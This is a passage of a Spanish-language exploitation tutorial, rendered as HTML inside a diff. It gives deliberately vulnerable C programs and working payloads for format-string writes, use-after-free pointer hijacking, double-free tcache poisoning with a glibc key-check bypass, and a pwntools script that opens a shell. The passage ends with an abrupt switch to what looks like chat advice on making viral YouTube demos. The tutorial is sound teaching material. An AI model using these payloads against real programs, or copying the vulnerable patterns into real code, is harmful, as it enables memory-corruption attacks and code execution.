+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./vuln &#34;AAAA %p %p %p %p %p %p&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encontrar en qué posición aparece 0x41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → esa es la posición directa: %N$</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404048</span>  <span style="color:#75715e"># dirección de &#39;target&#39;</span>
+</span></span><span style="display:flex;"><span>VALUE  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337</span>   <span style="color:#75715e"># valor a escribir (4919)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %N$n escribe N bytes impresos en la dirección</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># que está en el argumento N del stack</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usamos pwntools para facilitar:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># from pwn import fmtstr_payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload = fmtstr_payload(6, {TARGET: VALUE})</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Manual:</span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, TARGET)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Imprimir (VALUE - 8) caracteres, luego %6$n</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> addr <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%4903c</span><span style="color:#e6db74">%6$n&#34;</span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><h3 id="primitivas-de-lectura-y-escritura">Primitivas de lectura y escritura</h3>
+<p><strong>Leer memoria:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./vuln <span style="color:#e6db74">&#34;%p %p %p %p&#34;</span>
+</span></span><span style="display:flex;"><span>./vuln <span style="color:#e6db74">&#34;%6</span>$p<span style="color:#e6db74">&#34;</span>    <span style="color:#75715e"># leer arg 6</span>
+</span></span><span style="display:flex;"><span>./vuln <span style="color:#e6db74">&#34;%s&#34;</span>      <span style="color:#75715e"># leer como string</span>
+</span></span></code></pre></div><p><strong>Escribir con <code>%n</code>:</strong></p>
+<pre tabindex="0"><code>%n   → escribe int    (4 bytes)
+%hn  → escribe short  (2 bytes)
+%hhn → escribe byte   (1 byte)
+</code></pre><blockquote>
+<p><code>%n</code> escribe en la dirección apuntada por el argumento la cantidad de caracteres impresos hasta ese punto. Permite escritura arbitraria de memoria.</p>
+</blockquote>
+<h3 id="compilar-y-explotar-1">Compilar y explotar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_fmtstr vuln_fmtstr.c -no-pie
+</span></span><span style="display:flex;"><span>./vuln_fmtstr <span style="color:#e6db74">&#34;AAAA %p %p %p %p %p %p&#34;</span>   <span style="color:#75715e"># encontrar posición</span>
+</span></span><span style="display:flex;"><span>./vuln_fmtstr <span style="color:#66d9ef">$(</span>python3 exploit_fmtstr.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>pip install pwntools                       <span style="color:#75715e"># librería que facilita todo</span>
+</span></span></code></pre></div><hr>
+<h2 id="3-use-after-free-cwe-416">3. Use-After-Free (CWE-416)</h2>
+<h3 id="código-vulnerable-2">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_uaf.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  role;         <span style="color:#75715e">// 0=user, 1=admin
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">24</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>print)();   <span style="color:#75715e">// puntero a función
+</span></span></span><span style="display:flex;"><span>} User;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">user_print</span>()  { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;soy user&#34;</span>); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">admin_print</span>() { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;soy ADMIN&#34;</span>);
+</span></span><span style="display:flex;"><span>                     <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>); }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    User <span style="color:#f92672">*</span>u <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(User));
+</span></span><span style="display:flex;"><span>    u<span style="color:#f92672">-&gt;</span>role  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    u<span style="color:#f92672">-&gt;</span>print <span style="color:#f92672">=</span> user_print;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(u);           <span style="color:#75715e">// ← liberado
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// u sigue siendo accesible → UAF
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Atacante controla esta asignación:
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(User));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(data, <span style="color:#66d9ef">sizeof</span>(User), stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    u<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">print</span>();  <span style="color:#75715e">// ← salta donde dijimos
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--heap-spray">Exploit — heap spray</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_uaf.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># struct User layout (en little-endian x86-64):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset 0:  role (int, 4 bytes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset 4:  padding (4 bytes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset 8:  name (24 bytes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># offset 32: print ptr (8 bytes)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb: p admin_print → 0x401196</span>
+</span></span><span style="display:flex;"><span>ADMIN_FUNC <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401196</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">1</span>)       <span style="color:#75715e"># role=1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>               <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hacked</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">24</span>)   <span style="color:#75715e"># name</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, ADMIN_FUNC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El nuevo malloc() reutiliza el mismo chunk</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escribimos admin_print en el offset del ptr</span>
+</span></span><span style="display:flex;"><span>print(payload<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span></code></pre></div><h3 id="por-qué-funciona-el-allocator-reutiliza-memoria">Por qué funciona: el allocator reutiliza memoria</h3>
+<pre tabindex="0"><code>chunk A   malloc(sizeof User) → 0x1a2b00       aloca User
+free      free(u) → chunk a la freelist        liberado
+chunk B   malloc(sizeof User) → 0x1a2b00 ←    reutilizado (¡mismo!)
+u-&gt;print  apunta ahora a admin_print()         hijacked
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_uaf vuln_uaf.c <span style="color:#f92672">&amp;&amp;</span> python3 exploit_uaf.py | ./vuln_uaf
+</span></span></code></pre></div><hr>
+<h2 id="4-double-free-cwe-415">4. Double Free (CWE-415)</h2>
+<h3 id="código-vulnerable-3">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_doublefree.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(a, <span style="color:#e6db74">&#34;dato sensible&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(a);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(b);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(a);  <span style="color:#75715e">// ← DOUBLE FREE: &#39;a&#39; liberado 2 veces
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// El heap ahora está corrupto
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// tcache: a→b→a (ciclo!)
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>x <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">32</span>);  <span style="color:#75715e">// x == a
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>y <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">32</span>);  <span style="color:#75715e">// y == b
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>z <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">32</span>);  <span style="color:#75715e">// z == a ← otra vez!
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// x y z apuntan a la misma memoria
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%p %p %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, x, y, z);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(x, <span style="color:#ae81ff">32</span>, stdin);   <span style="color:#75715e">// controla z también
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, z);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="explotación--tcache-poisoning">Explotación — tcache poisoning</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_df.py (tcache poisoning en glibc 2.31+)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Double free crea un ciclo en tcache:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># freelist: a → b → a → b → ...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Se puede hacer malloc de una dirección arbitraria</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En versiones modernas glibc:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Verifican tcache-&gt;key para detectar double free</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - Hay que corromper ese campo primero</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Técnica con UAF previo para borrar key:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   a = malloc(32); free(a)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   a[8] = 0  # borra tcache key</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   free(a)   # ahora sí, double free exitoso</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET_ADDR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404060</span>  <span style="color:#75715e"># dirección a alloc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Al hacer malloc() una 3ra vez, obtenemos ptr</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># que apunta a TARGET_ADDR</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → escritura arbitraria de heap</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, TARGET_ADDR)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Chunk 1 (x):&#34;</span>, payload<span style="color:#f92672">.</span>hex())
+</span></span></code></pre></div><h3 id="flujo-del-ataque-en-tcache">Flujo del ataque en tcache</h3>
+<ol>
+<li><code>free(a)</code> → tcache[32]: <code>[a → NULL]</code></li>
+<li><code>free(b)</code> → tcache[32]: <code>[b → a → NULL]</code></li>
+<li><code>free(a)</code> → tcache[32]: <code>[a → b → a]</code> ← ciclo infinito</li>
+<li><code>malloc()</code> x3 → se obtiene <code>a</code>, luego <code>b</code>, luego <strong><code>a</code> de nuevo</strong> = alias de puntero</li>
+<li>Escribir en <code>x</code> también escribe en <code>z</code> → corrupción controlada del heap</li>
+</ol>
+<blockquote>
+<p><strong>Nota:</strong> glibc ≥ 2.29 incluye detección de double free en tcache con un campo <code>key</code>. El bypass consiste en sobreescribir ese campo via UAF antes del segundo free.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_df vuln_doublefree.c
+</span></span></code></pre></div><hr>
+<h2 id="resumen-de-primitivas-por-ataque">Resumen de primitivas por ataque</h2>
+<table>
+	<thead>
+			<tr>
+					<th>Vulnerabilidad</th>
+					<th>Primitiva de lectura</th>
+					<th>Primitiva de escritura</th>
+					<th>Objetivo típico</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Buffer Overflow</td>
+					<td>—</td>
+					<td>Sobreescribir RIP</td>
+					<td>Redirigir ejecución</td>
+			</tr>
+			<tr>
+					<td>Format String</td>
+					<td><code>%p</code>, <code>%s</code></td>
+					<td><code>%n</code>, <code>%hn</code>, <code>%hhn</code></td>
+					<td>Leer/escribir memoria arbitraria</td>
+			</tr>
+			<tr>
+					<td>Use-After-Free</td>
+					<td>puntero colgante</td>
+					<td>Reasignación controlada</td>
+					<td>Hijackear punteros a función</td>
+			</tr>
+			<tr>
+					<td>Double Free</td>
+					<td>—</td>
+					<td>tcache poisoning</td>
+					<td>malloc() de dirección arbitraria</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h2 id="automatizar-con-pwntools">Automatizar con pwntools</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_bof&#39;</span>)        <span style="color:#75715e"># o remote(&#39;host&#39;, port)</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./vuln_bof&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encontrar dirección de una función automáticamente</span>
+</span></span><span style="display:flex;"><span>secret_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;secret&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generar payload con el offset correcto</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({<span style="color:#ae81ff">72</span>: secret_addr})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()   <span style="color:#75715e"># obtener shell interactiva</span>
+</span></span></code></pre></div><hr>
+<h2 id="próximos-pasos">Próximos pasos</h2>
+<ul>
+<li><strong>ret2libc</strong> — para cuando hay NX habilitado (no hay stack ejecutable)</li>
+<li><strong>ROP chains</strong> — reutilizar gadgets del binario para eludir NX + ASLR</li>
+<li><strong>Heap exploitation avanzada</strong> — tcache dup, fastbin attack, unsorted bin attack</li>
+<li><strong>ASLR bypass</strong> — info leaks para obtener direcciones base en tiempo real</li>
+</ul>
+<p>Buena dirección — esto tiene DEMASIADO material para hacer un video viral. Te armo un ranking por <strong>impacto visual en pantalla</strong> (que se vea el &ldquo;hack&rdquo; o el crash con output dramático).</p>
 <h2 id="antes-tu-mejor-amigo-para-los-demos">Antes: tu mejor amigo para los demos</h2>
 <p>Compilá siempre con sanitizers. El output es <strong>dorado</strong> para YouTube:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -g -fsanitize<span style="color:#f92672">=</span>address,undefined -o demo demo.c
